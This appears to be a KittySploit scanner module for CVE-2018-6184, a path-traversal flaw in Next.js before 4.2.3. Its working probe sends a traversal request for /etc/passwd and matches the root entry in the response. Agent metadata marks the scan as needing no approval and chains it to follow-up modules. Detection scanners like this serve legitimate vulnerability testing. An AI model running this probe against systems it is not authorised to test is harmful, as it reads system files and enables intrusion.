#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zeit Next."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zeit Next.js < 4.2.3 - Local File Inclusion Detection',
        'description': 'Zeit Next.js before 4.2.3 is susceptible to local file inclusion under the /_next request namespace. An attacker can obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'nextjs', 'lfi', 'traversal', 'zeit', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PortSwigger/j2ee-scan/blob/master/src/main/java/burp/j2ee/issues/impl/NextFrameworkPathTraversal.java',
            'https://github.com/zeit/next.js/releases/tag/4.2.3',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-6184',
            'https://github.com/lnick2023/nicenice',
            'https://github.com/masasron/vulnerability-research',
        ],
        'cve': 'CVE-2018-6184',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_next/../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Zeit Next.js < 4.2.3 - Local File Inclusion detected",
                path='/_next/../../../../../../../../../etc/passwd',
            )
            return True
        return False

